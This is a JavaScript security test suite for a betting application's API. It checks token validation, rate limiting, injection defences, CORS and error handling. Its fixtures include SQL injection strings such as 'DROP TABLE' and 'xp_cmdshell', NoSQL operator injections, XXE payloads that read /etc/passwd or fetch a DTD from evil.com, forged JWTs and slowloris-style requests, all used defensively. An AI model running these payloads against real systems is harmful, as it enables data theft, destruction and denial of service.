const APISecurityUtils = require('../utils/api-security.util');
const SecurityConfig = require('../utils/config.util');
const NetworkUtils = require('../utils/network.util');

describe('🌐 API Security Testing Suite', () => {
    
    let apiClient;
    
    before(async () => {
        apiClient = new APISecurityUtils();
        await apiClient.initialize();
    });

    describe('🔐 API Authentication Security', () => {
        
        it('should enforce proper JWT token validation', async () => {
            await allure.addLabel('epic', 'API Security');
            await allure.addLabel('feature', 'Authentication');
            await allure.addLabel('severity', 'critical');
            
            // Test with malformed JWT tokens
            const malformedTokens = [
                'invalid.jwt.token',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
                'Bearer malicious_token',
                '',
                null,
                'expired_token_12345'
            ];
            
            for (const token of malformedTokens) {
                const response = await apiClient.makeAuthenticatedRequest('/api/user/profile', {
                    method: 'GET',
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                
                expect(response.status).toBe(401);
                expect(response.body).not.toHaveProperty('sensitive_data');
                
                await allure.addStep(`Malformed token rejected: ${token?.substring(0, 20)}...`);
            }
        });

        it('should prevent JWT token manipulation attacks', async () => {
            await allure.addLabel('severity', 'critical');
            
            // Get a valid token first
            const validToken = await apiClient.getValidToken('testuser', 'password123');
            
            // Attempt various token manipulation techniques
            const manipulationAttempts = [
                // Change algorithm to 'none'
                apiClient.manipulateJWTAlgorithm(validToken, 'none'),
                // Change user ID in payload
                apiClient.manipulateJWTPayload(validToken, { user_id: 'admin' }),
                // Extend expiration time
                apiClient.manipulateJWTPayload(validToken, { exp: Date.now() + 86400000 }),
                // Change signature
                validToken.substring(0, validToken.lastIndexOf('.')) + '.malicious_signature'
            ];
            
            for (const manipulatedToken of manipulationAttempts) {
                const response = await apiClient.makeAuthenticatedRequest('/api/betting/place', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${manipulatedToken}` },
                    body: { amount: 100, match_id: 1 }
                });
                
                expect(response.status).toBe(401);
                await allure.addStep('Token manipulation attempt blocked');
            }
        });

        it('should enforce API rate limiting per endpoint', async () => {
            await allure.addLabel('severity', 'high');
            
            const rateLimitTests = [
                { endpoint: '/api/login', limit: 5, timeWindow: 60000 },
                { endpoint: '/api/betting/place', limit: 10, timeWindow: 60000 },
                { endpoint: '/api/user/profile', limit: 20, timeWindow: 60000 }
            ];
            
            for (const test of rateLimitTests) {
                let blockedRequests = 0;
                const startTime = Date.now();
                
                // Make requests rapidly to exceed limit
                for (let i = 0; i < test.limit + 5; i++) {
                    const response = await apiClient.makeRequest(test.endpoint, {
                        method: 'GET',
                        timeout: 5000
                    });
                    
                    if (response.status === 429) {
                        blockedRequests++;
                    }
                    
                    // Small delay to simulate rapid requests
                    await browser.pause(100);
                }
                
                expect(blockedRequests).toBeGreaterThan(0);
                await allure.addStep(`Rate limiting active on ${test.endpoint}: ${blockedRequests} requests blocked`);
            }
        });
    });

    describe('💉 API Injection Attack Prevention', () => {
        
        it('should prevent SQL injection in API parameters', async () => {
            await allure.addLabel('severity', 'critical');
            
            const sqlPayloads = [
                "1' OR '1'='1",
                "'; DROP TABLE bets; --",
                "1 UNION SELECT * FROM users --",
                "1'; EXEC xp_cmdshell('dir'); --",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --"
            ];
            
            const vulnerableEndpoints = [
                '/api/betting/history',
                '/api/user/transactions',
                '/api/matches/details',
                '/api/reports/user'
            ];
            
            for (const endpoint of vulnerableEndpoints) {
                for (const payload of sqlPayloads) {
                    // Test in URL parameters
                    const response1 = await apiClient.makeRequest(`${endpoint}?id=${encodeURIComponent(payload)}`);
                    
                    // Test in request body
                    const response2 = await apiClient.makeRequest(endpoint, {
                        method: 'POST',
                        body: { user_id: payload, filter: payload }
                    });
                    
                    // Should not expose database errors or data
                    expect(response1.status).not.toBe(500);
                    expect(response2.status).not.toBe(500);
                    expect(response1.body).not.toMatch(/SQL|database|table|column/i);
                    expect(response2.body).not.toMatch(/SQL|database|table|column/i);
                    
                    await allure.addStep(`SQL injection blocked in ${endpoint} with payload: ${payload}`);
                }
            }
        });

        it('should prevent NoSQL injection attacks', async () => {
            await allure.addLabel('severity', 'high');
            
            const nosqlPayloads = [
                "'; return true; var x='",
                "\\'; return true; var x=\\'",
                "1; return true",
                "{$where: 'return true'}",
                "{$ne: null}",
                "{$regex: '.*'}",
                "{$gt: ''}"
            ];
            
            for (const payload of nosqlPayloads) {
                const response = await apiClient.makeRequest('/api/user/search', {
                    method: 'POST',
                    body: { 
                        query: payload,
                        filter: payload
                    }
                });
                
                // Should not return unauthorized data
                expect(response.status).not.toBe(200);
                if (response.status === 200) {
                    expect(response.body.results).toHaveLength(0);
                }
                
                await allure.addStep(`NoSQL injection blocked: ${payload}`);
            }
        });

        it('should prevent XML/XXE injection attacks', async () => {
            await allure.addLabel('severity', 'high');
            
            const xxePayloads = [
                `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`,
                `<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]>`,
                `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://evil.com/malicious.dtd"> %xxe;]>`
            ];
            
            for (const payload of xxePayloads) {
                const response = await apiClient.makeRequest('/api/data/import', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/xml' },
                    body: payload
                });
                
                // Should not process malicious XML
                expect(response.status).toBe(400);
                expect(response.body).not.toContain('root:x:0:0');
                expect(response.body).not.toContain('file system');
                
                await allure.addStep(`XXE injection blocked`);
            }
        });
    });

    describe('🔒 API Data Protection', () => {
        
        it('should enforce proper CORS policies', async () => {
            await allure.addLabel('severity', 'medium');
            
            const maliciousOrigins = [
                'http://evil.com',
                'https://malicious-betting-site.com',
                'http://localhost:8080',
                'null',
                '*'
            ];
            
            for (const origin of maliciousOrigins) {
                const response = await apiClient.makeRequest('/api/user/profile', {
                    method: 'GET',
                    headers: { 'Origin': origin }
                });
                
                const corsHeader = response.headers['access-control-allow-origin'];
                expect(corsHeader).not.toBe('*');
                expect(corsHeader).not.toBe(origin);
                
                await allure.addStep(`CORS policy enforced for origin: ${origin}`);
            }
        });

        it('should not expose sensitive data in API responses', async () => {
            await allure.addLabel('severity', 'critical');
            
            const token = await apiClient.getValidToken('testuser', 'password123');
            
            const sensitiveEndpoints = [
                '/api/user/profile',
                '/api/betting/history',
                '/api/account/details',
                '/api/transactions/list'
            ];
            
            for (const endpoint of sensitiveEndpoints) {
                const response = await apiClient.makeAuthenticatedRequest(endpoint, {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                
                if (response.status === 200) {
                    const responseText = JSON.stringify(response.body);
                    
                    // Check for exposed sensitive data
                    const sensitivePatterns = [
                        /password/i,
                        /secret/i,
                        /private.*key/i,
                        /api.*key/i,
                        /database.*url/i,
                        /jwt.*secret/i,
                        /encryption.*key/i
                    ];
                    
                    for (const pattern of sensitivePatterns) {
                        expect(responseText).not.toMatch(pattern);
                    }
                    
                    await allure.addStep(`No sensitive data exposed in ${endpoint}`);
                }
            }
        });

        it('should implement proper input validation', async () => {
            await allure.addLabel('severity', 'high');
            
            const invalidInputTests = [
                {
                    endpoint: '/api/betting/place',
                    data: { amount: -100, match_id: 'invalid' },
                    expectedStatus: 400
                },
                {
                    endpoint: '/api/user/update',
                    data: { email: 'not-an-email', age: 'abc' },
                    expectedStatus: 400
                },
                {
                    endpoint: '/api/transactions/create',
                    data: { amount: 'A'.repeat(10000) },
                    expectedStatus: 400
                }
            ];
            
            for (const test of invalidInputTests) {
                const response = await apiClient.makeRequest(test.endpoint, {
                    method: 'POST',
                    body: test.data
                });
                
                expect(response.status).toBe(test.expectedStatus);
                expect(response.body).toHaveProperty('error');
                
                await allure.addStep(`Input validation enforced for ${test.endpoint}`);
            }
        });
    });

    describe('🔍 API Security Headers', () => {
        
        it('should enforce security headers on all API endpoints', async () => {
            await allure.addLabel('severity', 'medium');
            
            const endpoints = [
                '/api/health',
                '/api/login',
                '/api/user/profile',
                '/api/betting/odds'
            ];
            
            const requiredHeaders = [
                'x-content-type-options',
                'x-frame-options',
                'x-xss-protection',
                'strict-transport-security',
                'content-security-policy'
            ];
            
            for (const endpoint of endpoints) {
                const response = await apiClient.makeRequest(endpoint);
                
                for (const header of requiredHeaders) {
                    expect(response.headers).toHaveProperty(header.toLowerCase());
                    await allure.addStep(`Security header ${header} present on ${endpoint}`);
                }
                
                // Verify specific header values
                expect(response.headers['x-content-type-options']).toBe('nosniff');
                expect(response.headers['x-frame-options']).toMatch(/DENY|SAMEORIGIN/);
            }
        });

        it('should prevent information disclosure in error responses', async () => {
            await allure.addLabel('severity', 'high');
            
            // Trigger various error conditions
            const errorTests = [
                '/api/nonexistent/endpoint',
                '/api/user/profile/999999999',
                '/api/betting/place/invalid',
                '/api/admin/secret-endpoint'
            ];
            
            for (const endpoint of errorTests) {
                const response = await apiClient.makeRequest(endpoint);
                
                if (response.status >= 400) {
                    const errorResponse = JSON.stringify(response.body);
                    
                    // Should not expose stack traces or system info
                    expect(errorResponse).not.toMatch(/stack.*trace/i);
                    expect(errorResponse).not.toMatch(/internal.*server/i);
                    expect(errorResponse).not.toMatch(/database.*error/i);
                    expect(errorResponse).not.toMatch(/file.*path/i);
                    expect(errorResponse).not.toMatch(/exception/i);
                    
                    await allure.addStep(`Error response properly sanitized for ${endpoint}`);
                }
            }
        });
    });

    describe('🚀 API Performance Security', () => {
        
        it('should handle large payload attacks', async () => {
            await allure.addLabel('severity', 'high');
            
            const largePayloads = [
                'A'.repeat(1000000),  // 1MB string
                'B'.repeat(5000000),  // 5MB string
                JSON.stringify({ data: 'C'.repeat(10000000) }) // 10MB JSON
            ];
            
            for (const payload of largePayloads) {
                const startTime = Date.now();
                
                const response = await apiClient.makeRequest('/api/data/upload', {
                    method: 'POST',
                    body: payload,
                    timeout: 10000
                });
                
                const responseTime = Date.now() - startTime;
                
                // Should reject large payloads quickly
                expect(response.status).toBe(413); // Payload Too Large
                expect(responseTime).toBeLessThan(5000); // Should fail fast
                
                await allure.addStep(`Large payload (${payload.length} bytes) rejected in ${responseTime}ms`);
            }
        });

        it('should prevent slowloris and similar attacks', async () => {
            await allure.addLabel('severity', 'high');
            
            // Simulate slow request attack
            const slowRequests = [];
            
            for (let i = 0; i < 10; i++) {
                const slowRequest = apiClient.makeSlowRequest('/api/health', {
                    method: 'GET',
                    slowDelay: 30000 // 30 second delay
                });
                slowRequests.push(slowRequest);
            }
            
            // Server should timeout these requests
            const results = await Promise.allSettled(slowRequests);
            const timedOutRequests = results.filter(r => 
                r.status === 'rejected' || 
                (r.status === 'fulfilled' && r.value.status === 408)
            );
            
            expect(timedOutRequests.length).toBeGreaterThan(0);
            await allure.addStep(`Slow request attack mitigated: ${timedOutRequests.length} requests timed out`);
        });
    });

    describe('🔐 API Business Logic Security', () => {
        
        it('should enforce betting business rules via API', async () => {
            await allure.addLabel('severity', 'critical');
            
            const token = await apiClient.getValidToken('testuser', 'password123');
            
            // Test various business rule violations
            const businessRuleTests = [
                {
                    name: 'Bet amount exceeds single limit',
                    data: { amount: 1500, match_id: 1, bet_type: 'home_win' },
                    expectedError: 'limit_exceeded'
                },
                {
                    name: 'Negative bet amount',
                    data: { amount: -100, match_id: 1, bet_type: 'draw' },
                    expectedError: 'invalid_amount'
                },
                {
                    name: 'Bet on finished match',
                    data: { amount: 100, match_id: 999, bet_type: 'away_win' },
                    expectedError: 'match_unavailable'
                }
            ];
            
            for (const test of businessRuleTests) {
                const response = await apiClient.makeAuthenticatedRequest('/api/betting/place', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${token}` },
                    body: test.data
                });
                
                expect(response.status).toBe(400);
                expect(response.body.error).toContain(test.expectedError);
                
                await allure.addStep(`Business rule enforced: ${test.name}`);
            }
        });

        it('should prevent API parameter pollution attacks', async () => {
            await allure.addLabel('severity', 'medium');
            
            const pollutionTests = [
                '/api/user/profile?user_id=1&user_id=2&user_id=admin',
                '/api/betting/history?limit=10&limit=1000&limit=-1',
                '/api/search?q=test&q[]=malicious&q={injection}'
            ];
            
            for (const pollutedEndpoint of pollutionTests) {
                const response = await apiClient.makeRequest(pollutedEndpoint);
                
                // Should handle parameter pollution gracefully
                expect(response.status).not.toBe(500);
                
                if (response.status === 200) {
                    // Should not return data based on malicious parameters
                    expect(response.body).not.toHaveProperty('admin_data');
                    expect(response.body).not.toHaveProperty('sensitive_info');
                }
                
                await allure.addStep(`Parameter pollution handled for: ${pollutedEndpoint}`);
            }
        });
    });

    after(async () => {
        // Generate comprehensive API security report
        const securitySummary = await apiClient.generateSecuritySummary();
        await allure.addAttachment('API Security Summary', 
            JSON.stringify(securitySummary, null, 2), 'application/json');
    });
});